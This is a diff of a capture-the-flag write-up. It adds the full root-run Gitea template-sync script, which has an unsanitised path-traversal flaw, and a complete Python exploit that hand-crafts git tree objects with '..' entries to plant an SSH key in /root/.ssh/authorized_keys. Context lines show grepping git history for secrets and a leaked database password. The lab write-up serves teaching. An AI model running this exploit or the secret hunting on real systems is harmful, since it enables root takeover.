@@ -131,6 +131,7 @@ cd krayin-docker-setup
 git log --all -p | grep -i "password\|api_key\|secret\|token"</code></pre>
 <img src="https://i.imgur.com/NI49iUl.png" alt="Grepping through git log -p output and finding the old password" />
 <p>Credentials were found!</p>
+<img src="https://i.imgur.com/vbysExG.png" alt="Krayin dashboard" />
 <pre><code>-DB_PASSWORD=N27xh!!2ucY04
 +DB_PASSWORD=</code></pre>
 
@@ -160,12 +161,150 @@ cat user.txt
 <p>Upon taking a look at the previous linpeas output again, this service seemed interesting and could possibly give us the privilege escalation we need — a systemd timer, <code>gitea-template-sync.timer</code>, running <code>/etc/gitea/template-sync.py</code> as <strong>root</strong>. The script walks any Gitea repo flagged <code>template:true</code> and copies its tracked files into a staging directory.</p>
 <img src="https://i.imgur.com/SZXsS6n.png" alt="Discovering the root-owned gitea-template-sync systemd timer" />
 <p>Below is the vulnerable code:</p>
-<pre><code>for mode, objhash, filepath in entries:
-    target = os.path.join(stage_path, filepath)
-    os.makedirs(os.path.dirname(target), exist_ok=True)
-    cat_result = subprocess.run(GIT + ['cat-file', 'blob', objhash], cwd=bare_path, ...)
-    with open(target, 'wb') as f:
-        f.write(cat_result.stdout)</code></pre>
+<pre><code>import os  
+import sys  
+import json  
+import subprocess  
+import time  
+import urllib.request  
+  
+GITEA_URL = "http://localhost:3000"  
+REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"  
+STAGING_DIR = "/home/git/template-staging"  
+LOG_FILE = "/var/log/template-sync.log"  
+  
+def log(msg):  
+    ts = time.strftime("%Y-%m-%d %H:%M:%S")  
+    line = "[%s] %s" % (ts, msg)  
+    print(line, flush=True)  
+    try:  
+        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)  
+        with open(LOG_FILE, 'a') as f:  
+            f.write(line + '\n')  
+    except:  
+        pass  
+  
+def load_config():  
+    config = {}  
+    for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']:  
+        try:  
+            with open(path) as f:  
+                for line in f:  
+                    line = line.strip()  
+                    if line and not line.startswith('#') and '=' in line:  
+                        k, v = line.split('=', 1)  
+                        config[k.strip()] = v.strip()  
+        except:  
+            pass  
+    return config  
+  
+def get_token():  
+    cfg = load_config()  
+    return cfg.get('GITEA_API_TOKEN')  
+  
+def get_template_repos(token):  
+    url = "%s/api/v1/repos/search?limit=50" % GITEA_URL  
+    req = urllib.request.Request(url, headers={  
+        'Authorization': 'token %s' % token  
+    })  
+    try:  
+        with urllib.request.urlopen(req) as resp:  
+            data = json.loads(resp.read())  
+            repos = data.get('data', data) if isinstance(data, dict) else data  
+            return [r for r in repos if r.get('template', False)]  
+    except Exception as e:  
+        log("API error: %s" % e)  
+        return []  
+  
+def sync_template(repo_info):  
+    owner = repo_info['owner']['login']  
+    name = repo_info['name'].lower()  
+    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)  
+    stage_path = os.path.join(STAGING_DIR, owner, name)  
+  
+    if not os.path.isdir(bare_path):  
+        log("  repo not found: %s" % bare_path)  
+        return  
+  
+    # Read tree entries from the bare repository  
+    try:  
+        GIT = ['git', '-c', 'safe.directory=*']  
+        result = subprocess.run(  
+            GIT + ['ls-tree', '-r', 'HEAD'],  
+            cwd=bare_path,  
+            capture_output=True, text=True, timeout=10  
+        )  
+        if result.returncode != 0:  
+            log("  ls-tree failed: %s" % result.stderr.strip())  
+            return  
+    except Exception as e:  
+        log("  ls-tree error: %s" % e)  
+        return  
+  
+    entries = []  
+    for line in result.stdout.strip().split('\n'):  
+        if not line:  
+            continue  
+        parts = line.split('\t', 1)  
+        if len(parts) != 2:  
+            continue  
+        meta, filepath = parts  
+        mode, objtype, objhash = meta.split()  
+        if objtype == 'blob':  
+            entries.append((mode, objhash, filepath))  
+  
+    if not entries:  
+        log("  no files in template")  
+        return  
+  
+    # Extract files to staging directory  
+    for mode, objhash, filepath in entries:  
+        target = os.path.join(stage_path, filepath)  
+        target_dir = os.path.dirname(target)  
+  
+        try:  
+            os.makedirs(target_dir, exist_ok=True)  
+            GIT = ['git', '-c', 'safe.directory=*']  
+            cat_result = subprocess.run(  
+                GIT + ['cat-file', 'blob', objhash],  
+                cwd=bare_path,  
+                capture_output=True, timeout=10  
+            )  
+            if cat_result.returncode != 0:  
+                continue  
+  
+            with open(target, 'wb') as f:  
+                f.write(cat_result.stdout)  
+  
+            if mode == '100755':  
+                os.chmod(target, 0o755)  
+            else:  
+                os.chmod(target, 0o644)  
+  
+            log("  synced: %s" % filepath)  
+        except Exception as e:  
+            log("  error syncing %s: %s" % (filepath, e))  
+  
+def main():  
+    log("Template sync starting")  
+  
+    token = get_token()  
+    if not token:  
+        log("No API token found")  
+        sys.exit(1)  
+  
+    templates = get_template_repos(token)  
+    log("Found %d template repo(s)" % len(templates))  
+  
+    for repo in templates:  
+        name = repo['full_name']  
+        log("Syncing template: %s" % name)  
+        sync_template(repo)  
+  
+    log("Template sync complete")  
+  
+if __name__ == '__main__':  
+    main()</code></pre>
 <p><code>filepath</code> comes straight from <code>git ls-tree</code> with zero sanitization, then flows into <code>os.path.join(stage_path, filepath)</code>, which happily walks <code>..</code> sequences right out of the staging directory. A tree entry literally named <code>../../../../../root/.ssh/authorized_keys</code> gets written to the real path — and since the script runs as root, the write goes through.</p>
 <p>Normally you couldn't get away with this — the standard <code>git</code> client refuses to let a tree entry contain <code>..</code>. <code>git add</code>, <code>git commit</code>, even <code>git update-index --cacheinfo</code>, all validate and reject it. The way around it is to skip the Git client entirely and hand-build the raw blob/tree/commit objects directly, since nothing at that layer checks path safety — only the porcelain commands do.</p>
 
@@ -182,20 +321,45 @@ curl -X PATCH http://localhost:3000/api/v1/repos/jones/rce \
 <img src="https://i.imgur.com/W7wqpAR.png" alt="Generating the SSH key and using the Gitea API to create and template-flag the repo" />
 
 <p>Created the malicious git repo, then found a script that'll allow for directory traversal — writes blob/tree/commit objects directly into <code>.git/objects/</code>, chains <code>..</code> tree entries around the <code>authorized_keys</code> blob, and manually points <code>refs/heads/main</code> at the crafted commit:</p>
-<pre><code>def write_obj(data, t):
-    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
-    sha = hashlib.sha1(h + data).hexdigest()
-    d = os.path.join(".git", "objects", sha[:2])
-    os.makedirs(d, exist_ok=True)
-    open(os.path.join(d, sha[2:]), "wb").write(zlib.compress(h + data))
-    return sha
-
-blob = write_obj(pubkey.encode(), "blob")
-ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")
-cur = write_obj(entry("40000", ".ssh", ssh_t), "tree")
-fir = write_obj(entry("40000", "root", cur), "tree")
-for i in range(4):
-    fir = write_obj(entry("40000", "..", fir), "tree")</code></pre>
+<pre><code>#!/usr/bin/env python3  
+import hashlib,zlib,os,subprocess,sys,time  
+  
+def write_obj(data,t):  
+    h=("%s %d"%(t,len(data))).encode()+b"\x00"  
+    s=h+data  
+    sha=hashlib.sha1(s).hexdigest()  
+    d=os.path.join(".git","objects",sha[:2])  
+    os.makedirs(d,exist_ok=True)  
+    p=os.path.join(d,sha[2:])  
+    if not os.path.exists(p):  
+        open(p,"wb").write(zlib.compress(s))  
+    return sha  
+  
+def entry(mode,name,sha):  
+    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)  
+  
+if not os.path.isdir(".git"):  
+    print("Run inside git repo");sys.exit(1)  
+  
+r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)  
+if r.returncode!=0:  
+    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)  
+key=r.stdout.strip()+"\n"  
+  
+blob=write_obj(key.encode(),"blob")  
+readme=write_obj(b"# Template\n","blob")  
+ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")  
+cur=write_obj(entry("40000",".ssh",ssh_t),"tree")  
+fir=write_obj(entry("40000","root",cur),"tree")  
+for i in range(4):  
+    fir=write_obj(entry("40000","..",fir),"tree")  
+root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")  
+ts=int(time.time())  
+c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)  
+sha=write_obj(c.encode(),"commit")  
+os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)  
+open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")  
+print("Done: "+sha)</code></pre>
 <img src="images/nexus/15-malicious-repo-init.jpg" alt="Initializing the local repo and setting the remote before crafting the objects" />
 
 <p>Then run <code>git push origin main</code>.</p>
